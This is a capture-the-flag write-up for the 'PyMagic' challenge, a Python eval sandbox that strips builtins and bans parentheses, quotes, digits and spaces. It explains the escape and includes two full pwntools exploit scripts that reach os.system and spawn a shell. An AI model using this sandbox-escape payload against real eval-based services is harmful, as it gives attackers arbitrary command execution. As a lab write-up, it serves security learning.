## TCP1P CTF 2023 PyMagic

```python
#!/usr/bin/env python3
import re

class something_to_do_huh:...
eval = eval
code = input('>>> ')

if not re.findall('[()\'"0123456789 ]', code):
    for k in (b:=__builtins__.__dict__).keys():
        b[k] = None
    
    eval(code, {'__builtins__': {}, '_': something_to_do_huh})
```

Requirements:

1. No `()`: Use `class.__class_getitem__` and `class[]` to bypass
2. No strings: Use docstrings and `str[index]` to create strings
3. No numbers: Use `True` as 1
4. No spaces: Use `\r` to bypass while making `input()` happy
5. No builtins: Use `().__class__.__base__.__subclasses__()`

First, we need to find the familiar classes we want, e.g. `_sitebuiltins._Helper` from `().__class__.__base__.__subclasses__()`. However, we cannot use `()`, so to invoke the function, inspired by [misc/PySysMagic writeup](https://starlit.melyr.space/posts/l3akctf-2024/pysysmagic/), we need to:

1. Assign `_.__class_getitem__` to `type.__subclasses__` using `[None for _.__class_getitem__ in [type.__subclasses__]]`
2. Use `_[[].__class__.__base__]` to invoke `().__class__.__base__.__subclasses__()`: because `_` is the class, so `_[arg]` is essentially `_.__class__getitem__(arg)`

Code:

```python
[
    type:=[].__class__.__class__,
    [None for _.__class_getitem__ in [type.__subclasses__]],
    _[[].__class__.__base__],
]
```

Then, we can locate the familiar classes here. The next thing is to get shell. Since `__class_getitem__` requires exactly one argument to call, so we use `sys.modules("os").system("sh")` directly instead:

1. To find `os`, we need to locate `_sitebuiltins.Printer` class
2. Under its `__init__.__globals__`, use `dict.values(arg)` to extract its values
3. Since `dict.values()` returns an iterator, convert it to list using `list(arg)`
4. Now sys is in the list: `sys = values[-4]`, os is `sys.modules["os"]`
5. Call `os.system("sh")` using the trick `[None for _.__class_getitem__ in [os.system]], _["sh"]`

The strings above are constructed from help text.

Attack script:

```python
from pwn import *

context(log_level="debug")

subclasses = str(().__class__.__base__.__subclasses__())

# find the indices of the builtins
# assuming we are using the same Python version as remote

# assuming dict is at 28
dict_index = 28
assert subclasses.split(", ").index("<class 'dict'>") == dict_index
# assuming list is at 42
list_index = 42
assert subclasses.split(", ").index("<class 'list'>") == list_index
# assuming Printer is at 160
printer_index = 160
assert subclasses.split(", ").index("<class '_sitebuiltins._Printer'>") == printer_index
# assuming Helper is at 161
helper_index = 161
assert subclasses.split(", ").index("<class '_sitebuiltins._Helper'>") == helper_index

help_text = ().__class__.__base__.__subclasses__()[helper_index].__doc__


def get_index(index):
    parts = (
        ["True"] * (index % 10)
        + ["A"] * (index // 10 % 10)
        + ["B"] * (index // 100 % 10)
    )
    return "+".join(parts)


# synthesize string from help_text
def synthesize(text):
    res = []
    for ch in text:
        index = help_text.index(ch)
        res.append("S[" + get_index(index) + "]")
    return "+".join(res)


p = process(["python3", "pymagic.py"])
p.recvuntil(b">>> ")
p.sendline(
    (
        # A=10, B=100
        "[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,"
        # get indices for dict, list, Printer, Helper
        + f"D:={get_index(dict_index)},"
        + f"L:={get_index(list_index)},"
        + f"P:={get_index(printer_index)},"
        + f"H:={get_index(helper_index)},"
        # _.__class_getitem__ becomes type.__subclasses__
        + "type:=[].__class__.__class__,[None for _.__class_getitem__ in [type.__subclasses__]],"
        # locate dict: type.__subclasses__([].__class__.__base__))[D]
        + "dict:=_[[].__class__.__base__][D],"
        # locate list
        + "list:=_[[].__class__.__base__][L],"
        # locate Printer
        + "Printer:=_[[].__class__.__base__][P],"
        # locate Helper
        + "Helper:=_[[].__class__.__base__][H],"
        # read help_text
        + "S:=Helper.__doc__,"
        # _.__class_getitem__ becomes dict.values
        + "[None for _.__class_getitem__ in [dict.values]],"
        # values = dict.values(Printer.__init__.__globals)
        + "[values:=_[Printer.__init__.__globals__],None][True],"
        # _.__class_getitem__ becomes list
        + "[None for _.__class_getitem__ in [list]],"
        # values = list(values)
        + "[values:=_[values],None][True],"
        # sys = values[-4]
        + "[sys:=values[True-True-True-True-True-True],None][True],"
        # os = sys.modules["os"]
        + f"[os:=sys.modules[{synthesize("os")}],None][True],"
        # _.__class_getitem__ becomes os.system
        + "[None for _.__class_getitem__ in [os.system]],"
        + f"_[{synthesize("sh")}],"
        + "]"
    )
    .replace(" ", "\r")
    .encode()
)
p.interactive()
```

Some tips on debugging: To aid debugging, we change the script to print result and complain if validation fails:

```python
#!/usr/bin/env python3
import re

class something_to_do_huh:...
eval = eval
print = print
code = input('>>> ')

if not re.findall('[()\'"0123456789 ]', code):
    for k in (b:=__builtins__.__dict__).keys():
        b[k] = None
    
    print(eval(code, {'__builtins__': {}, '_': something_to_do_huh}))
else:
    print("fail")
```

However, `print`-ing some values may fail due to missing builtins. Therefore, we convert the non-printable values by converting:

```python
[
    A:=B,
]
```

to

```python
[
    [A:=B, None][True],
]
```

That's why it appears weird in the attack script above. Actually, it can be simplified:

```python
from pwn import *

context(log_level="debug")

subclasses = str(().__class__.__base__.__subclasses__())

# find the indices of the builtins
# assuming we are using the same Python version as remote

# assuming dict is at 28
dict_index = 28
assert subclasses.split(", ").index("<class 'dict'>") == dict_index
# assuming list is at 42
list_index = 42
assert subclasses.split(", ").index("<class 'list'>") == list_index
# assuming Printer is at 160
printer_index = 160
assert subclasses.split(", ").index("<class '_sitebuiltins._Printer'>") == printer_index
# assuming Helper is at 161
helper_index = 161
assert subclasses.split(", ").index("<class '_sitebuiltins._Helper'>") == helper_index

help_text = ().__class__.__base__.__subclasses__()[helper_index].__doc__


def get_index(index):
    parts = (
        ["True"] * (index % 10)
        + ["A"] * (index // 10 % 10)
        + ["B"] * (index // 100 % 10)
    )
    return "+".join(parts)


# synthesize string from help_text
def synthesize(text):
    res = []
    for ch in text:
        index = help_text.index(ch)
        res.append("S[" + get_index(index) + "]")
    return "+".join(res)


p = process(["python3", "pymagic.py"])
p.recvuntil(b">>> ")
p.sendline(
    (
        # A=10, B=100
        "[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,"
        # get indices for dict, list, Printer, Helper
        + f"D:={get_index(dict_index)},"
        + f"L:={get_index(list_index)},"
        + f"P:={get_index(printer_index)},"
        + f"H:={get_index(helper_index)},"
        # _.__class_getitem__ becomes type.__subclasses__
        + "type:=[].__class__.__class__,[None for _.__class_getitem__ in [type.__subclasses__]],"
        # locate dict: type.__subclasses__([].__class__.__base__))[D]
        + "dict:=_[[].__class__.__base__][D],"
        # locate list
        + "list:=_[[].__class__.__base__][L],"
        # locate Printer
        + "Printer:=_[[].__class__.__base__][P],"
        # locate Helper
        + "Helper:=_[[].__class__.__base__][H],"
        # read help_text
        + "S:=Helper.__doc__,"
        # _.__class_getitem__ becomes dict.values
        + "[None for _.__class_getitem__ in [dict.values]],"
        # values = dict.values(Printer.__init__.__globals)
        + "values:=_[Printer.__init__.__globals__],"
        # _.__class_getitem__ becomes list
        + "[None for _.__class_getitem__ in [list]],"
        # values = list(values)
        + "values:=_[values],"
        # sys = values[-4]
        + "sys:=values[True-True-True-True-True-True],"
        # os = sys.modules["os"]
        + f"os:=sys.modules[{synthesize("os")}],"
        # _.__class_getitem__ becomes os.system
        + "[None for _.__class_getitem__ in [os.system]],"
        + f"_[{synthesize("sh")}],"
        + "]"
    )
    .replace(" ", "\r")
    .encode()
)
p.interactive()
```

